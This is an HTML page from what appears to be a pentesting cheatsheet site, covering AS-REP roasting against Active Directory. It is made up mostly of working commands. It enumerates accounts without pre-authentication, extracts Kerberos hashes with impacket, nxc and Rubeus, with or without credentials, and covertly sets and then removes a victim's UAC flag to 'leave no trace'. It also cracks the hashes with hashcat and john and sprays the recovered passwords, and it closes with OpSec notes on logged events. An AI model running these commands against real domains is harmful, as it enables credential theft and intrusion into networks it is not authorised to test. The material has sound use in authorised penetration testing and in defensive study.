+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Active Directory Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/active-directory/ class=cheatsheet-sidebar-section>Active Directory Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/active-directory/00-ad-moc/ class=cheatsheet-sidebar-link>AD MOC</a></li><li><a href=/cheatsheets/active-directory/ad01-enumeration/ class=cheatsheet-sidebar-link>Enumeration</a></li><li><a href=/cheatsheets/active-directory/ad02-bloodhound/ class=cheatsheet-sidebar-link>BloodHound</a></li><li><a href=/cheatsheets/active-directory/ad03-kerberoasting/ class=cheatsheet-sidebar-link>Kerberoasting</a></li><li><a href=/cheatsheets/active-directory/ad04-as-rep-roasting/ class="cheatsheet-sidebar-link is-current">AS-REP Roasting</a></li><li><a href=/cheatsheets/active-directory/ad05-password-spraying/ class=cheatsheet-sidebar-link>Password Spraying</a></li><li><a href=/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/ class=cheatsheet-sidebar-link>LLMNR & NTLM Relay</a></li><li><a href=/cheatsheets/active-directory/ad07-acl-abuse/ class=cheatsheet-sidebar-link>ACL Abuse</a></li><li><a href=/cheatsheets/active-directory/ad08-delegation/ class=cheatsheet-sidebar-link>Delegation</a></li><li><a href=/cheatsheets/active-directory/ad09-adcs-esc1-16/ class=cheatsheet-sidebar-link>ADCS ESC1-16</a></li><li><a href=/cheatsheets/active-directory/ad10-lateral-movement/ class=cheatsheet-sidebar-link>Lateral Movement</a></li><li><a href=/cheatsheets/active-directory/ad11-credential-dumping/ class=cheatsheet-sidebar-link>Credential Dumping</a></li><li><a href=/cheatsheets/active-directory/ad12-dcsync/ class=cheatsheet-sidebar-link>DCSync</a></li><li><a href=/cheatsheets/active-directory/ad13-trust-attacks/ class=cheatsheet-sidebar-link>Trust Attacks</a></li><li><a href=/cheatsheets/active-directory/ad14-persistence/ class=cheatsheet-sidebar-link>Persistence</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>AS-REP Roasting</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>AS-REP Roasting</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Active Directory Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/active-directory/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/active-directory/00-ad-moc/ class=cheatsheet-mobile-sections-link>AD MOC</a></li><li><a href=/cheatsheets/active-directory/ad01-enumeration/ class=cheatsheet-mobile-sections-link>Enumeration</a></li><li><a href=/cheatsheets/active-directory/ad02-bloodhound/ class=cheatsheet-mobile-sections-link>BloodHound</a></li><li><a href=/cheatsheets/active-directory/ad03-kerberoasting/ class=cheatsheet-mobile-sections-link>Kerberoasting</a></li><li><a href=/cheatsheets/active-directory/ad04-as-rep-roasting/ class="cheatsheet-mobile-sections-link is-current">AS-REP Roasting</a></li><li><a href=/cheatsheets/active-directory/ad05-password-spraying/ class=cheatsheet-mobile-sections-link>Password Spraying</a></li><li><a href=/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/ class=cheatsheet-mobile-sections-link>LLMNR & NTLM Relay</a></li><li><a href=/cheatsheets/active-directory/ad07-acl-abuse/ class=cheatsheet-mobile-sections-link>ACL Abuse</a></li><li><a href=/cheatsheets/active-directory/ad08-delegation/ class=cheatsheet-mobile-sections-link>Delegation</a></li><li><a href=/cheatsheets/active-directory/ad09-adcs-esc1-16/ class=cheatsheet-mobile-sections-link>ADCS ESC1-16</a></li><li><a href=/cheatsheets/active-directory/ad10-lateral-movement/ class=cheatsheet-mobile-sections-link>Lateral Movement</a></li><li><a href=/cheatsheets/active-directory/ad11-credential-dumping/ class=cheatsheet-mobile-sections-link>Credential Dumping</a></li><li><a href=/cheatsheets/active-directory/ad12-dcsync/ class=cheatsheet-mobile-sections-link>DCSync</a></li><li><a href=/cheatsheets/active-directory/ad13-trust-attacks/ class=cheatsheet-mobile-sections-link>Trust Attacks</a></li><li><a href=/cheatsheets/active-directory/ad14-persistence/ class=cheatsheet-mobile-sections-link>Persistence</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>Request a TGT for any user without <code>DONT_REQ_PREAUTH</code> set. The response is encrypted with the user&rsquo;s NT key. Crack offline.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>DC</span><span class=o>=</span>10.10.11.50
+</span></span><span class=line><span class=cl><span class=nv>DOMAIN</span><span class=o>=</span>corp.local
+</span></span><span class=line><span class=cl><span class=nv>USER</span><span class=o>=</span><span class=s1>&#39;svc_user&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>PASS</span><span class=o>=</span><span class=s1>&#39;Password1&#39;</span>
+</span></span></code></pre></div><h2 id=i-find-as-rep-roastable-users data-heading-permalink=true><span class=heading-content>i. Find AS-REP roastable users</span>
+<a class=heading-permalink href=#i-find-as-rep-roastable-users aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>UAC flag is <code>DONT_REQ_PREAUTH</code> (bit 4194304 / 0x400000).</p><p>BloodHound:</p><pre tabindex=0><code class=language-cypher data-lang=cypher>MATCH (u:User {dontreqpreauth: true, enabled: true}) RETURN u.name
+</code></pre><p>bloodyAD filter:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> get search <span class=se>\
+</span></span></span><span class=line><span class=cl>  --filter <span class=s1>&#39;(userAccountControl:1.2.840.113556.1.4.803:=4194304)&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  --attr samaccountname
+</span></span></code></pre></div><p>nxc enumerates and pulls hashes in one call (see next section).</p><h2 id=ii-with-creds-roast-everything data-heading-permalink=true><span class=heading-content>ii. With creds, roast everything</span>
+<a class=heading-permalink href=#ii-with-creds-roast-everything aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>nxc, pulls every no-preauth user automatically:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --asreproast asrep.txt
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=nv>$USER</span> -H <span class=nv>$NTHASH</span> --asreproast asrep.txt
+</span></span><span class=line><span class=cl><span class=c1>## When DNS is funky:</span>
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --asreproast asrep.txt --kdcHost <span class=nv>$DOMAIN</span>
+</span></span></code></pre></div><p>impacket-GetNPUsers:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-GetNPUsers -dc-ip <span class=nv>$DC</span> -request <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>/&#34;</span> -usersfile users.txt -format hashcat -outputfile asrep.txt
+</span></span><span class=line><span class=cl><span class=c1>## With creds (no usersfile needed, enumerates from LDAP):</span>
+</span></span><span class=line><span class=cl>impacket-GetNPUsers -dc-ip <span class=nv>$DC</span> -request <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>/</span><span class=nv>$USER</span><span class=s2>:</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -format hashcat -outputfile asrep.txt
+</span></span><span class=line><span class=cl>impacket-GetNPUsers -dc-ip <span class=nv>$DC</span> -request -hashes :<span class=nv>$NTHASH</span> <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>/</span><span class=nv>$USER</span><span class=s2>&#34;</span> -format hashcat -outputfile asrep.txt
+</span></span></code></pre></div><p>Rubeus from Windows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+</span></span><span class=line><span class=cl>Rubeus.exe asreproast /user:victim /format:hashcat /outfile:asrep.txt
+</span></span></code></pre></div><h2 id=iii-without-creds-just-a-user-list data-heading-permalink=true><span class=heading-content>iii. Without creds, just a user list</span>
+<a class=heading-permalink href=#iii-without-creds-just-a-user-list aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>This is why AS-REP roasting is special: you don&rsquo;t need a valid credential, just a username to test. kerbrute + nxc combo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## 1. Enumerate valid usernames</span>
+</span></span><span class=line><span class=cl>kerbrute userenum -d <span class=nv>$DOMAIN</span> --dc <span class=nv>$DC</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.valid
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## 2. nxc with empty password against the user list</span>
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u users.valid -p <span class=s1>&#39;&#39;</span> --asreproast asrep-anon.txt
+</span></span></code></pre></div><p>Or impacket directly with a username list and no creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-GetNPUsers -dc-ip <span class=nv>$DC</span> -no-pass -usersfile users.valid -format hashcat -outputfile asrep.txt
+</span></span></code></pre></div><div class="obsidian-callout callout-tip"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5.0 0011 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5s3 3.5 3 5.5A7 7 0 115 15c0-1.153.433-2.294 1-3a2.5 2.5.0 002.5 2.5z"/></svg></div><span class=obsidian-callout-title>Always test</span></div><div class=obsidian-callout-body><p>Even when you don&rsquo;t know if any users are no-preauth, run <code>nxc ldap $DC -u users.valid -p '' --asreproast</code> - empty hash file = nothing to roast, valid hashes = free creds.</p></div></div><h2 id=iv-targeted-as-rep-set-dont_req_preauth-yourself data-heading-permalink=true><span class=heading-content>iv. Targeted AS-REP (set DONT_REQ_PREAUTH yourself)</span>
+<a class=heading-permalink href=#iv-targeted-as-rep-set-dont_req_preauth-yourself aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When you have GenericWrite (or any UAC-write right) on a user, flip the flag, roast, flip it back. bloodyAD makes this clean:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## 1. Add the flag</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> add uac victim -f DONT_REQ_PREAUTH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## 2. Roast the now-vulnerable user</span>
+</span></span><span class=line><span class=cl>impacket-GetNPUsers -dc-ip <span class=nv>$DC</span> -no-pass -usersfile &lt;<span class=o>(</span><span class=nb>echo</span> victim<span class=o>)</span> -format hashcat -outputfile asrep.txt
+</span></span><span class=line><span class=cl><span class=c1>## or nxc:</span>
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u victim -p <span class=s1>&#39;&#39;</span> --asreproast asrep.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## 3. Remove the flag, leave no trace</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> remove uac victim -f DONT_REQ_PREAUTH
+</span></span></code></pre></div><p>This is the cleanest &ldquo;I have GenericWrite on someone&rdquo; -> &ldquo;I have their hash&rdquo; chain. Often easier than targeted kerberoast because it doesn&rsquo;t require the user to have an SPN attribute.</p><h2 id=v-cracking-the-hash data-heading-permalink=true><span class=heading-content>v. Cracking the hash</span>
+<a class=heading-permalink href=#v-cracking-the-hash aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Format is <code>$krb5asrep$23$user@DOMAIN:checksum$ciphertext</code>.</p><p>Hashcat:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>18200</span> asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+</span></span><span class=line><span class=cl>hashcat -m <span class=m>18200</span> asrep.txt rockyou.txt -r OneRuleToRuleThemAll.rule
+</span></span></code></pre></div><p>John:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john --format<span class=o>=</span>krb5asrep --wordlist<span class=o>=</span>rockyou.txt asrep.txt
+</span></span></code></pre></div><p>AS-REP hashes use RC4 (etype 23) by default for the encrypted portion, so cracking speed is comparable to kerberoasting RC4 (much faster than AES TGS).</p><h2 id=vi-after-cracking-what-to-do data-heading-permalink=true><span class=heading-content>vi. After cracking, what to do</span>
+<a class=heading-permalink href=#vi-after-cracking-what-to-do aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>The cracked credential belongs to the no-preauth user. Service accounts and shared accounts are often flagged DONT_REQ_PREAUTH because the admin couldn&rsquo;t get Kerberos pre-auth to work and disabled it. Spray it everywhere:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u victim -p <span class=s1>&#39;Cracked123!&#39;</span> --shares
+</span></span><span class=line><span class=cl>nxc winrm <span class=nv>$DC</span> -u victim -p <span class=s1>&#39;Cracked123!&#39;</span>
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u victim -p <span class=s1>&#39;Cracked123!&#39;</span> --users
+</span></span></code></pre></div><p>Then re-collect BloodHound to see what edges open up from the newly-owned user.</p><h2 id=vii-why-as-rep-roasting-is-everywhere data-heading-permalink=true><span class=heading-content>vii. Why AS-REP roasting is everywhere</span>
+<a class=heading-permalink href=#vii-why-as-rep-roasting-is-everywhere aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Old smartcard / multi-domain setups disable pre-auth for compatibility</li><li>Some legacy apps fail with pre-auth enabled, admins disable it as a quick fix</li><li>Auto-provisioning scripts sometimes set the flag during user creation and never unset it</li><li>DONT_REQ_PREAUTH is rarely audited because it doesn&rsquo;t generate normal logs</li></ul><p>On a real engagement, even one no-preauth account in a domain of 10,000 users is often enough to start the chain.</p><h2 id=viii-opsec data-heading-permalink=true><span class=heading-content>viii. OpSec</span>
+<a class=heading-permalink href=#viii-opsec aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Each AS-REP request logs as Event 4768 on the DC (TGT requested)</li><li>Empty-password binds for asreproast don&rsquo;t log as 4625 (failed auth), they just look like AS_REQs</li><li>Targeted ASREP via UAC flip leaves an audit trail in 5136 (directory object modified) if AD auditing is enabled</li><li>Always remove the flag immediately after roasting in section iv</li></ul></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/active-directory/ad03-kerberoasting/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>Kerberoasting</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/active-directory/ad05-password-spraying/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>Password Spraying</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
